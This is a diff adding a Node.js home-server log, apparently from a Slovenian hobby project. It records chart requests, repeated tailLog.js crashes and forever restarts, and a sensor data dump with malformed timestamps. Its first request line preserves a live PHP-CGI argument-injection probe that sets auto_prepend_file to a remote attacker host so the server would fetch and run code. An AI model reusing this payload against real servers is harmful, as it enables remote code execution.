@@ -1,0 +1,868 @@
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-24T23:06:59.919Z Incoming Request from: 191.96.249.97 for href: /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+pošiljam 404 Error: ENOENT, open '/root/cgi-bin'
+2017-04-24T23:25:00.607Z Incoming Request from: 77.141.192.207 for href: /
+2017-04-24T23:26:01.867Z Incoming Request from: 151.24.135.219 for href: /
+2017-04-25T00:25:28.757Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T00:25:30.047Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T00:25:33.578Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=840208.3689397748
+
+/root/tailLog.js:15
+			throw err;
+			      ^
+Error: Command failed: tail: can't open '/root/.forever/2017-04-23r.log': No such file or directory
+tail: no files
+
+    at ChildProcess.exithandler (child_process.js:637:15)
+    at ChildProcess.EventEmitter.emit (events.js:98:17)
+    at maybeClose (child_process.js:743:16)
+    at Socket.<anonymous> (child_process.js:956:11)
+    at Socket.EventEmitter.emit (events.js:95:17)
+    at Pipe.close (net.js:466:12)
+error: Forever detected script exited with code: 8
+error: Script restart attempt #1
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T00:25:52.525Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T00:26:03.574Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T00:26:07.222Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=739409.0128811768
+2017-04-25T00:26:20.643Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T00:26:20.854Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T00:26:24.033Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=814939.7268834844
+2017-04-25T00:27:58.322Z Incoming Request from: 93.103.1.23 for href: /
+2017-04-25T00:27:58.411Z Incoming Request from: 93.103.1.23 for href: /canvas3d.js
+2017-04-25T00:27:59.379Z Incoming Request from: 93.103.1.23 for href: /spremeni.js
+2017-04-25T00:27:59.477Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=740001.9035019425
+2017-04-25T00:28:02.476Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=891049.8638624415
+2017-04-25T00:28:05.477Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=950405.895035094
+2017-04-25T00:28:08.515Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=584682.5265146161
+2017-04-25T00:28:11.501Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=577863.3295468824
+2017-04-25T00:28:14.483Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=787790.459413731
+2017-04-25T00:28:17.484Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=148708.09627806846
+2017-04-25T00:28:20.485Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=227303.69806458062
+2017-04-25T00:28:23.485Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=308171.7847917418
+2017-04-25T00:28:26.486Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=684958.9207722422
+2017-04-25T00:28:29.487Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=861394.225159793
+2017-04-25T00:28:32.488Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=775338.3109810886
+2017-04-25T00:28:35.488Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=911543.0113989975
+2017-04-25T00:28:38.490Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=672603.7595956101
+2017-04-25T00:28:41.507Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=856717.271957558
+2017-04-25T00:28:44.519Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=917654.5411767152
+2017-04-25T00:28:47.531Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=959602.5777348003
+2017-04-25T00:28:50.494Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=792337.9222440046
+2017-04-25T00:28:53.584Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=273787.56701632345
+2017-04-25T00:28:56.496Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=678174.1773552418
+2017-04-25T00:28:59.497Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=2591.91260132563
+2017-04-25T00:29:02.499Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=799556.7972102753
+2017-04-25T00:29:05.500Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=379949.3152719078
+2017-04-25T00:29:08.502Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=345440.062380729
+2017-04-25T00:29:11.501Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=461647.6909561813
+2017-04-25T00:29:14.502Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=377375.08407517883
+2017-04-25T00:29:17.564Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=473980.9683646112
+2017-04-25T00:29:20.538Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=582726.2975592939
+2017-04-25T00:29:23.506Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=948108.9224489436
+2017-04-25T00:29:26.508Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=196292.67527574234
+2017-04-25T00:29:35.057Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T00:29:35.238Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T00:29:35.541Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=564184.1367845983
+2017-04-25T00:29:35.856Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T01:22:48.307Z Incoming Request from: 46.223.58.46 for href: /
+2017-04-25T03:12:56.668Z Incoming Request from: 158.130.6.191 for href: /
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T05:32:05.298Z Incoming Request from: 168.195.68.167 for href: /
+2017-04-25T06:07:32.353Z Incoming Request from: 54.213.108.14 for href: /
+2017-04-25T06:36:57.764Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T06:36:57.967Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T06:36:58.234Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=248483.44879042995
+2017-04-25T06:36:58.927Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T06:37:05.579Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T06:37:05.715Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T06:37:05.806Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=709252.4417479396
+2017-04-25T06:37:05.975Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T06:43:34.999Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T06:43:35.073Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T06:43:35.444Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=298222.96518073865
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #1
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T06:46:17.551Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T06:46:17.853Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T06:46:18.227Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=371480.99206156406
+pošiljam 500 - 3: TypeError: undefined is not a function
+2017-04-25T06:46:22.888Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T06:46:23.064Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T06:46:23.366Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=320426.64642403595
+pošiljam 500 - 3: TypeError: undefined is not a function
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #2
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T06:51:17.566Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T06:51:17.833Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T06:51:18.211Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=897830.6581760602
+2017-04-25T06:51:38.747Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T06:51:38.824Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T06:51:39.204Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=784130.7901412677
+2017-04-25T06:51:44.982Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T06:51:45.160Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T06:51:45.466Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=802240.022466409
+2017-04-25T06:56:54.896Z Incoming Request from: 196.52.43.51 for href: /
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #3
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:00:42.680Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:00:42.985Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:00:43.369Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=654460.9335292495
+pošiljam 500 - 3: TypeError: undefined is not a function
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #4
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:10:27.080Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:10:27.375Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:10:27.745Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=350725.22893908207
+pošiljam 500 - 3: TypeError: undefined is not a function
+2017-04-25T07:10:33.960Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:10:34.561Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:10:35.482Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=356088.31118614634
+pošiljam 500 - 3: TypeError: undefined is not a function
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #5
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:11:41.786Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:11:42.495Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:11:43.169Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=335690.115917858
+
+/root/tailLog.js:31
+		cb(tailS);
+		^
+TypeError: undefined is not a function
+    at /root/tailLog.js:31:3
+    at ChildProcess.exithandler (child_process.js:635:7)
+    at ChildProcess.EventEmitter.emit (events.js:98:17)
+    at maybeClose (child_process.js:743:16)
+    at Socket.<anonymous> (child_process.js:956:11)
+    at Socket.EventEmitter.emit (events.js:95:17)
+    at Pipe.close (net.js:466:12)
+error: Forever detected script exited with code: 8
+error: Script restart attempt #6
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:11:50.033Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:11:50.441Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:11:50.715Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=375811.9067498329
+
+/root/tailLog.js:31
+		cb(tailS);
+		^
+TypeError: undefined is not a function
+    at /root/tailLog.js:31:3
+    at ChildProcess.exithandler (child_process.js:635:7)
+    at ChildProcess.EventEmitter.emit (events.js:98:17)
+    at maybeClose (child_process.js:743:16)
+    at Socket.<anonymous> (child_process.js:956:11)
+    at Socket.EventEmitter.emit (events.js:95:17)
+    at Pipe.close (net.js:466:12)
+error: Forever detected script exited with code: 8
+error: Script restart attempt #7
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #8
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:18:04.794Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:18:05.071Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:18:05.485Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=90740.45448681134
+
+/root/tailLog.js:31
+		cb(tailS);
+		^
+TypeError: undefined is not a function
+    at /root/tailLog.js:31:3
+    at ChildProcess.exithandler (child_process.js:635:7)
+    at ChildProcess.EventEmitter.emit (events.js:98:17)
+    at maybeClose (child_process.js:743:16)
+    at Socket.<anonymous> (child_process.js:956:11)
+    at Socket.EventEmitter.emit (events.js:95:17)
+    at Pipe.close (net.js:466:12)
+error: Forever detected script exited with code: 8
+error: Script restart attempt #9
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:18:11.546Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:18:11.965Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:18:12.222Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=407616.8211738995
+
+/root/tailLog.js:31
+		cb(tailS);
+		^
+TypeError: undefined is not a function
+    at /root/tailLog.js:31:3
+    at ChildProcess.exithandler (child_process.js:635:7)
+    at ChildProcess.EventEmitter.emit (events.js:98:17)
+    at maybeClose (child_process.js:743:16)
+    at Socket.<anonymous> (child_process.js:956:11)
+    at Socket.EventEmitter.emit (events.js:95:17)
+    at Pipe.close (net.js:466:12)
+error: Forever detected script exited with code: 8
+error: Script restart attempt #10
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:18:35.418Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:18:35.871Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:18:36.075Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=452114.04844272154
+
+/root/tailLog.js:31
+		cb(tailS);
+		^
+TypeError: undefined is not a function
+    at /root/tailLog.js:31:3
+    at ChildProcess.exithandler (child_process.js:635:7)
+    at ChildProcess.EventEmitter.emit (events.js:98:17)
+    at maybeClose (child_process.js:743:16)
+    at Socket.<anonymous> (child_process.js:956:11)
+    at Socket.EventEmitter.emit (events.js:95:17)
+    at Pipe.close (net.js:466:12)
+error: Forever detected script exited with code: 8
+error: Script restart attempt #11
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #12
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:19:46.069Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:19:46.361Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:19:46.724Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=748978.2330032965
+2017-04-25T07:19:56.269Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:19:56.367Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:19:56.762Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=468600.20606748475
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #13
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:28:33.507Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:28:33.774Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:28:36.106Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=852281.1381456992
+2017-04-25T07:28:44.566Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:28:44.718Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:28:45.158Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=450005.8897402586
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #14
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:30:46.887Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:30:47.301Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:30:47.692Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=621004.5842429945
+[["2017-4-24 18:31:14","2017-4-24 18:45:20","2017-4-24 18:46:10","2017-4-24 18:49:0","2017-4-24 18:52:0","2017-4-24 18:54:55","2017-4-24 18:58:0","2017-4-24 19:1:1","2017-4-24 19:3:56","2017-4-24 19:6:56","2017-4-24 19:9:56","2017-4-24 19:12:56","2017-4-24 19:15:56","2017-4-24 19:18:57","2017-4-24 19:21:57","2017-4-24 19:24:57","2017-4-24 19:27:57","2017-4-24 19:30:57","2017-4-24 19:33:57","2017-4-24 19:36:58","2017-4-24 19:39:58","2017-4-24 19:42:58","2017-4-24 19:45:58","2017-4-24 19:48:58","2017-4-24 19:51:58","2017-4-24 19:54:59","2017-4-24 19:57:59","2017-4-24 19:60:59","2017-4-24 20:3:59","2017-4-24 20:6:59","2017-4-24 20:10:0","2017-4-24 20:13:0","2017-4-24 20:16:0","2017-4-24 20:19:0","2017-4-24 20:22:0","2017-4-24 20:25:0","2017-4-24 20:28:1","2017-4-24 20:30:56","2017-4-24 20:33:56","2017-4-24 20:36:56","2017-4-24 20:39:56","2017-4-24 20:42:56","2017-4-24 20:45:57","2017-4-24 20:48:57","2017-4-24 20:51:57","2017-4-24 20:54:57","2017-4-24 20:57:57","2017-4-24 20:60:57","2017-4-24 21:3:58","2017-4-24 21:6:58","2017-4-24 21:9:58","2017-4-24 21:12:58","2017-4-24 21:15:58","2017-4-24 21:18:58","2017-4-24 21:21:59","2017-4-24 21:24:59","2017-4-24 21:27:59","2017-4-24 21:30:59","2017-4-24 21:33:59","2017-4-24 21:36:59","2017-4-24 21:40:0","2017-4-24 21:43:0","2017-4-24 21:46:0","2017-4-24 21:49:0","2017-4-24 21:52:0","2017-4-24 21:55:1","2017-4-24 21:58:1","2017-4-24 21:60:56","2017-4-24 22:3:56","2017-4-24 22:6:56","2017-4-24 22:9:56","2017-4-24 22:12:57","2017-4-24 22:15:57","2017-4-24 22:18:57","2017-4-24 22:21:57","2017-4-24 22:24:57","2017-4-24 22:27:57","2017-4-24 22:30:58","2017-4-24 22:33:58","2017-4-24 22:36:58","2017-4-24 22:39:58","2017-4-24 22:42:58","2017-4-24 22:45:58","2017-4-24 22:48:59","2017-4-24 22:51:59","2017-4-24 22:54:59","2017-4-24 22:57:59","2017-4-24 22:60:59","2017-4-24 23:3:59","2017-4-24 23:7:0","2017-4-24 23:10:0","2017-4-24 23:13:0","2017-4-24 23:16:0","2017-4-24 23:19:0","2017-4-24 23:22:0","2017-4-24 23:25:1","2017-4-24 23:28:1","2017-4-24 23:30:56","2017-4-24 23:33:56","2017-4-24 23:36:56","2017-4-24 23:39:56","2017-4-24 23:42:57","2017-4-24 23:45:57","2017-4-24 23:48:57","2017-4-24 23:51:57","2017-4-24 23:54:57","2017-4-24 23:57:57","2017-4-24 24:6:57","2017-4-24 24:9:57","2017-4-24 24:12:57","2017-4-24 24:15:57","2017-4-24 24:18:58","2017-4-24 24:21:58","2017-4-24 24:25:0","2017-4-24 24:28:0","2017-4-24 24:31:1","2017-4-24 24:34:1","2017-4-24 24:36:57","2017-4-24 24:39:57","2017-4-24 24:42:58","2017-4-24 24:45:58","2017-4-24 24:48:58","2017-4-24 24:52:0","2017-4-24 24:55:0","2017-4-24 24:58:0","2017-4-25 1:1:1","2017-4-25 1:4:1","2017-4-25 1:7:1","2017-4-25 1:9:57","2017-4-25 1:12:58","2017-4-25 1:26:45","2017-4-25 1:27:40","2017-4-25 1:28:0","2017-4-25 1:36:46","2017-4-25 1:36:56","2017-4-25 1:36:56","2017-4-25 1:37:17","2017-4-25 1:39:57","2017-4-25 1:42:58","2017-4-25 1:45:58","2017-4-25 1:48:59","2017-4-25 1:51:59","2017-4-25 1:54:59","2017-4-25 1:58:0","2017-4-25 2:1:0","2017-4-25 2:4:0","2017-4-25 2:8:1","2017-4-25 2:11:1","2017-4-25 2:14:1","2017-4-25 2:16:57","2017-4-25 2:19:57","2017-4-25 2:22:58","2017-4-25 2:25:58","2017-4-25 2:28:57","2017-4-25 2:31:58","2017-4-25 2:34:58","2017-4-25 2:37:58","2017-4-25 2:40:58","2017-4-25 2:43:58","2017-4-25 2:46:59","2017-4-25 2:49:59","2017-4-25 2:52:59","2017-4-25 2:55:59","2017-4-25 2:58:59","2017-4-25 3:2:0","2017-4-25 3:5:0","2017-4-25 3:8:0","2017-4-25 3:11:0","2017-4-25 3:13:56","2017-4-25 3:16:57","2017-4-25 3:19:57","2017-4-25 3:22:57","2017-4-25 3:25:58","2017-4-25 3:28:59","2017-4-25 3:31:59","2017-4-25 3:35:0","2017-4-25 3:38:0","2017-4-25 3:41:0","2017-4-25 3:44:1","2017-4-25 3:46:56","2017-4-25 3:49:56","2017-4-25 3:52:56","2017-4-25 3:55:57","2017-4-25 3:58:57","2017-4-25 4:1:57","2017-4-25 4:4:57","2017-4-25 4:7:57","2017-4-25 4:10:58","2017-4-25 4:13:58","2017-4-25 4:16:58","2017-4-25 4:19:58","2017-4-25 4:22:59","2017-4-25 4:25:59","2017-4-25 4:28:59","2017-4-25 4:31:59","2017-4-25 4:35:0","2017-4-25 4:38:0","2017-4-25 4:41:0","2017-4-25 4:44:0","2017-4-25 4:47:0","2017-4-25 4:50:1","2017-4-25 4:53:1","2017-4-25 4:56:1","2017-4-25 4:58:57","2017-4-25 5:1:57","2017-4-25 5:4:58","2017-4-25 5:7:58","2017-4-25 5:10:58","2017-4-25 5:13:58","2017-4-25 5:16:59","2017-4-25 5:19:59","2017-4-25 5:22:59","2017-4-25 5:25:59","2017-4-25 5:29:0","2017-4-25 5:32:0","2017-4-25 5:35:0","2017-4-25 5:38:0","2017-4-25 5:41:1","2017-4-25 5:44:1","2017-4-25 5:46:56","2017-4-25 5:49:57","2017-4-25 5:52:57","2017-4-25 5:55:57","2017-4-25 5:58:58","2017-4-25 6:1:58","2017-4-25 6:4:58","2017-4-25 6:7:58","2017-4-25 6:10:59","2017-4-25 6:13:59","2017-4-25 6:16:59","2017-4-25 6:20:0","2017-4-25 6:23:0","2017-4-25 6:26:0","2017-4-25 6:29:1","2017-4-25 6:31:56","2017-4-25 6:33:9","2017-4-25 6:38:1","2017-4-25 6:40:56","2017-4-25 6:43:56","2017-4-25 6:46:56","2017-4-25 6:49:57","2017-4-25 6:52:57","2017-4-25 6:55:57","2017-4-25 6:58:57","2017-4-25 7:1:57","2017-4-25 7:4:57","2017-4-25 7:7:58","2017-4-25 7:10:58","2017-4-25 7:13:58","2017-4-25 7:16:58","2017-4-25 7:19:58","2017-4-25 7:22:58","2017-4-25 7:25:59","2017-4-25 7:28:59","2017-4-25 7:31:59","2017-4-25 7:34:59","2017-4-25 7:37:59","2017-4-25 7:40:59","2017-4-25 7:44:0","2017-4-25 7:47:0","2017-4-25 7:50:0","2017-4-25 7:53:0","2017-4-25 7:56:0","2017-4-25 7:59:1","2017-4-25 8:2:1","2017-4-25 8:5:1","2017-4-25 8:7:56","2017-4-25 8:10:56","2017-4-25 8:13:56","2017-4-25 8:16:56","2017-4-25 8:19:57","2017-4-25 8:22:57","2017-4-25 8:25:57","2017-4-25 8:28:57","2017-4-25 8:31:57","2017-4-25 8:34:57","2017-4-25 8:37:58","2017-4-25 8:40:58","2017-4-25 8:43:58","2017-4-25 8:46:59","2017-4-25 8:50:0","2017-4-25 8:53:0","2017-4-25 8:56:1","2017-4-25 8:59:1","2017-4-25 9:1:56","2017-4-25 9:4:57","2017-4-25 9:7:57","2017-4-25 9:10:57","2017-4-25 9:13:57","2017-4-25 9:16:57","2017-4-25 9:19:57","2017-4-25 9:22:58","2017-4-25 9:25:58","2017-4-25 9:28:58",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null],["0.87","0.91","0.87","0.87","0.87","0.91","0.87","0.87","0.91","0.91","0.87","0.91","0.91","0.91","0.91","0.91","0.91","0.87","0.87","0.91","0.87","0.91","0.91","0.87","0.87","0.87","0.87","0.87","0.91","0.91","0.87","0.91","0.87","0.91","0.87","0.91","0.91","0.87","0.87","0.87","0.87","0.87","0.87","0.87","0.87","0.87","0.87","0.91","0.87","0.91","0.87","0.91","0.91","0.91","0.87","0.91","0.91","0.91","0.87","0.87","0.87","0.87","0.87","0.87","0.91","0.87","0.91","0.87","0.83","0.87","0.91","0.87","0.91","0.87","0.91","0.91","0.91","0.87","0.87","0.87","0.87","0.91","0.91","0.87","0.91","0.91","0.87","0.87","0.87","0.87","0.87","0.91","0.91","0.87","0.87","0.87","0.87","0.91","0.87","0.91","0.87","0.87","0.91","0.91","0.91","0.91","0.87","0.91","0.91","0.91","0.91","0.91","0.87","0.87","0.91","0.87","0.91","0.91","0.87","0.91","0.87","0.87","0.87","0.91","0.87","0.87","0.87","0.87","0.87","0.87","0.87","0.91","0.91","0.87","0.87","0.87","0.91","0.91","0.91","0.91","0.87","0.87","0.87","0.87","0.91","0.87","0.87","0.91","0.87","0.87","0.87","0.87","0.87","0.87","0.87","0.91","0.87","0.87","0.91","0.87","0.87","0.91","0.91","0.83","0.87","0.87","0.87","0.87","0.87","0.91","0.87","0.91","0.87","0.87","0.87","0.91","0.91","0.87","0.91","0.91","0.87","0.87","0.91","0.91","0.91","0.87","0.91","0.91","0.87","0.91","0.87","0.87","0.87","0.91","0.87","0.87","0.87","0.91","0.87","0.91","0.87","0.87","0.91","0.87","0.87","0.87","0.87","0.87","0.91","0.91","0.87","0.91","0.87","0.91","0.91","0.87","0.87","0.91","0.91","0.91","0.87","0.87","0.87","0.87","0.87","0.87","0.91","0.87","0.91","0.87","0.91","0.87","0.87","0.91","0.91","0.87","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39","-2.39",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]]
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #15
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #16
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:33:48.325Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:33:48.994Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:33:49.389Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=967427.9728732009
+2017-04-25T07:39:10.652Z Incoming Request from: 93.103.1.23 for href: /
+2017-04-25T07:39:11.232Z Incoming Request from: 93.103.1.23 for href: /canvas3d.js
+2017-04-25T07:39:11.244Z Incoming Request from: 93.103.1.23 for href: /spremeni.js
+2017-04-25T07:39:11.514Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=999893.0547204048
+2017-04-25T07:39:14.462Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=348993.0348770913
+2017-04-25T07:39:17.464Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=341772.6733338364
+2017-04-25T07:39:20.465Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=929296.7237993713
+2017-04-25T07:39:23.488Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=656002.5006083248
+2017-04-25T07:39:26.469Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=887178.5302867057
+2017-04-25T07:39:29.472Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=449650.9173466754
+2017-04-25T07:39:32.471Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=739869.9790919998
